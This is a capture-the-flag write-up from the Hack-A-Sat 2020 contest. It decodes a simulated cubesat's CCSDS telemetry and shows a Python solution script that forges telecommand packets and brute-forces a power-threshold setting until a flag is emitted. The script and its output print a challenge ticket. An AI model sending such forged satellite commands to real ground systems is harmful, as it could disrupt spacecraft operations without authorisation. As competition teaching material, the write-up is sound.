# SPACE SECURITY CHALLENGE 2020 HACK-A-SAT: Talk to me, Goose

* **Category:** Ground Segment
* **Points:** 94 (at the end of the challenge)
* **Solves:** 42
* **Description:**

> LaunchDotCom has a new satellite, the Carnac 2.0. What can you do with it from its design doc?
>
> Connecting
>
> Connect to the challenge on goose.satellitesabove.me:5033 . Using netcat, you might run nc goose.satellitesabove.me 5033 
>
>  You'll need these files to solve the challenge.
>
>    https://static.2020.hackasat.com/bee6d2abe5f9584cdb3cc5cfb992e6d0d296bdaa/LaunchDotCom_Carnac_2.zip
>    https://static.2020.hackasat.com/f672797d6ee126b10ad14716f1d840d925c95ce9/cmd_telemetry_defs.zip

## Write-up

_Write-up by Solar Wine team_

## Provided files

* `LaunchDotCom_Carnac_2.zip` contains a PDF file, which describes an
  experimental cubesat. It boasts impressive features, such as space-time
  continuum monitoring in the upper atmosphere (is it a joke, or advanced
  physics beyond my knowledge? hard to tell starting this challenge at 2AM)...
  and a CTF Flag Generation subsystem!

* `cmd_telemetry_defs.zip` contains the telemetry frame definitions, in XTCE.
  This file is also represented in the aforementioned PDF file, but organizers
  have kindly provided this much more easy to use version.

## Connection

Upon connection, the server sends us what looks like telemetry data, without
FCS code! Time to fire up scapy to decode this. CCSDS TM packets were dissected
using the following scapy class, which had been debugged earlier in the
afternoon while working on the `space_race` challenge:

```python
class TMPacketHeader(Packet):
    name = "TMPacketHeader"
    fields_desc = [
        BitField("CCSDS_VERSION", 0, 3),
        BitField("CCSDS_TYPE", 0, 1),
        BitField("CCSDS_SEC_HD", 0, 1),
        BitField("CCSDS_APID", 0, 11),
        BitField("CCSDS_GP_FLAGS", 0, 2),
        BitField("CCSDS_SSC", 0, 14),
        ShortField("CCSDS_PLENGTH", None)
        ]

    def post_build(self, pkt, payload):
        if payload:
            pkt += payload

        if self.getfieldval('CCSDS_PLENGTH') is None:
            # No need to account for the CRCflag in the length computation
            # since it is seen as part of the payload
            l = len(payload) - 1
            if self.CCSDS_SEC_HD:
                l += 3
            pkt = pkt[:4] + struct.pack("!H", l) + pkt[6:]
        return pkt
```

The Telemetry payload has the following format:

```python
MODE_STATUS_ENUM = {1: "ON", 0: "OFF"}
PW_STATUS_ENUM = {1: "PWR_ON", 0: "PWR_OFF"}
ENABLED_STATUS_ENUM = {1: "ENABLED", 0: "DISABLED"}

class EPSData(Packet):
    name = "EPS Data"
    fields_desc = [
        ShortField("BATT_TEMP", 0),
        IntField("BATT_VOLTAGE", 0),
        IntField("LOW_PWR_THRESH", 0),
        BitEnumField("LOW_PWR_MODE", 0, 1, MODE_STATUS_ENUM),
        BitEnumField("BATT_HTR", 0, 1, PW_STATUS_ENUM),
        BitEnumField("PAYLOAD_PWR", 0, 1, PW_STATUS_ENUM),
        BitEnumField("FLAG_PWR", 0, 1, PW_STATUS_ENUM),
        BitEnumField("ADCS_PWR", 0, 1, PW_STATUS_ENUM),
        BitEnumField("RADIO1_PWR", 0, 1, PW_STATUS_ENUM),
        BitEnumField("RADIO2_PWR", 0, 1, PW_STATUS_ENUM),
        BitField("UNUSED1", 0, 1),
        BitEnumField("PAYLOAD_ENABLE", 0, 1, MODE_STATUS_ENUM),
        BitEnumField("FLAG_ENABLE", 0, 1, MODE_STATUS_ENUM),
        BitEnumField("ADCS_ENABLE", 0, 1, MODE_STATUS_ENUM),
        BitEnumField("RADIO1_ENABLE", 0, 1, MODE_STATUS_ENUM),
        BitEnumField("RADIO2_ENABLE", 0, 1, MODE_STATUS_ENUM),
        BitField("UNUSED3", 0, 3),
        # IntField("BAD_CMD_COUNT", 0),
    ]

bind_layers(TMPacketHeader, EPSData, CCSDS_APID=103)
```

Astute readers might notice that the voltage fields are 16-bits long, whereas
the specification indicates that they are 32-bits long! This was initially
very puzzling, because received packet sizes did not match our understanding of
the spec... it took about 1.5 hour to reach this revelation, after a few
iterations of the classic "I don't understand anything, I'll to to sleep"/"Or
maybe I'll try just one more thing..." routine.

The XTCE specification also describes commands that can be send over the CCSDS
TC protocol. Some of them seem really interesting:

* `\x00\x02\x01` enables the Flag service!
* `\x00\x00\x01` enables the Payload
* `\x00\x04\x01` enables ADCS
* `\x00\x0c` (+ 2 bytes) sets the Low Power Threshold value

We could see that the effect of the commands we sent was reflected in the
received telemetry.

Alas, enabling the Flag service did not result in a flag being received...

We noticed that the `BATT_VOLTAGE` value was lower than `LOW_PWR_THRESH` in
telemetry data. So, we tried a lot of things to get the flag service running:
tried shutting most services down, to set the Low Power Threshold to a
higher value... to no avail. Maybe trying to be smart is too hard at this late
hour, so we turned to brute force.

We then wrote a dirty loop that sent all commands we had identified, and tried
all possible 2-byte values for the `LOW_PWR_THRESH` setting... And a flag
popped. It was decoded using the following scapy class:

```python
class FlagData(Packet):
    name = "FlagPacket"
    fields_desc = [BitField("FLAG{}".format(i), 0, 7) for i in range(1,121)]

bind_layers(TMPacketHeader, FlagData, CCSDS_APID=102)
```

Almost 4AM. Time to sleep.

## Solution script

A fully autonomous script that displays the flag was polished after the challenge.

```python
#!/usr/bin/env python3
from scapy.all import *
import datetime
import re
import struct
import sys
# python3 -m pip install --upgrade pwntools
from pwn import *


class TMPacketHeader(Packet):
    name = "TMPacketHeader"
    fields_desc = [
        BitField("CCSDS_VERSION", 0, 3),
        BitField("CCSDS_TYPE", 0, 1),
        BitField("CCSDS_SEC_HD", 0, 1),
        BitField("CCSDS_APID", 0, 11),
        BitField("CCSDS_GP_FLAGS", 3, 2),
        BitField("CCSDS_SSC", 0, 14),
        ShortField("CCSDS_PLENGTH", None)
        ]

    def post_build(self, pkt, payload):
        """
        """
        if payload:
            pkt += payload

        if self.getfieldval('CCSDS_PLENGTH') is None:
            # No need to account for the CRCflag in the length computation
            # since it is seen as part of the payload
            l = len(payload) - 1
            if self.CCSDS_SEC_HD:
                l += 3
            pkt = pkt[:4] + struct.pack("!H", l) + pkt[6:]
        return pkt


class FlagData(Packet):
    name = "FlagPacket"
    fields_desc = [BitField("FLAG{}".format(i), 0, 7) for i in range(1,121)]

    def flagvalue(pkt):
        flag = ""
        for fld in pkt.fields_desc:
            v = pkt.getfield_and_val(fld.name)[1]
            flag += chr(v)
        flagendidx = flag.index("}")
        return flag[:flagendidx+1]


bind_layers(TMPacketHeader, FlagData, CCSDS_APID=102)


if __name__ == '__main__':
    log.info(f"Current time is {datetime.datetime.now().isoformat()}")
    TICKET = ("ticket{sierra9703delta:GCz4SfUxuHKAYbCUU7gp1Z7V2M-"
              "INpvdOfKGlw8UnmXv_0hFsywtMey7vPAGbx4YpQ}")
    conn = remote('goose.satellitesabove.me',5033)
    l = conn.recvline()
    with log.progress("Sending ticket") as lp:
        conn.sendline(TICKET)
        lp.success()
    l = conn.recvline()
    log.info(l.decode())
    m = re.match(b'Telemetry Service running at (\S+):(\S+)', l)
    conn.close()
    host, port = m.groups()

    conn = remote(host, int(port))
    lp = log.progress("Waiting for the flag")

    def recv_one():
        raw = conn.recv()
        p = TMPacketHeader(raw)
        if p.haslayer(FlagData):
            lp.success()
            log.success(f"Flag value is: {p['FlagPacket'].flagvalue()}")
            log.info(f"Current time is {datetime.datetime.now().isoformat()}")
            sys.exit(0)

    for i in range(2):
        recv_one()
    
    # why start at 4? because we noticed it's faster than starting at 0
    # we actually send TC packets (CCSDS_TYPE=1) but were too lazy to write
    # proper scapy layers
    for i in range(4, 2**16):
        # LOW PWR THRES
        p = TMPacketHeader(CCSDS_TYPE=1, CCSDS_APID=103)/(
            b"\x00\x0c" + struct.pack('<H', i))
        conn.send(bytes(p))
        recv_one()

        #enable flag
        p = TMPacketHeader(CCSDS_TYPE=1, CCSDS_APID=103)/("\x00\x02\x01")
        conn.send(bytes(p))
        recv_one()

        # enable Payload
        p = TMPacketHeader(CCSDS_TYPE=1, CCSDS_APID=103)/("\x00\x00\x01")
        conn.send(bytes(p))
        recv_one()

        # enable ADCS
        p = TMPacketHeader(CCSDS_TYPE=1, CCSDS_APID=103)/("\x00\x04\x01")
        conn.send(bytes(p))
        recv_one()

        # enable radio1
        p = TMPacketHeader(CCSDS_TYPE=1, CCSDS_APID=103)/("\x00\x05\x01")
        conn.send(bytes(p))
        recv_one()

        # enable radio2
        p = TMPacketHeader(CCSDS_TYPE=1, CCSDS_APID=103)/("\x00\x08\x01")
        conn.send(bytes(p))
        recv_one()
```

This script has the following output:

```
[*] Current time is 2020-06-07T13:41:35.693469
[+] Opening connection to goose.satellitesabove.me on port 5033: Done
[+] Sending ticket: Done
[*] Telemetry Service running at 18.221.17.174:32166
[*] Closed connection to goose.satellitesabove.me port 5033
[+] Opening connection to b'18.221.17.174' on port 32166: Done
[+] Waiting for the flag: Done
[+] Flag value is: flag{sierra9703delta:GEjpe-gs7T(...)1He6bc}
[*] Current time is 2020-06-07T13:41:45.295260
```
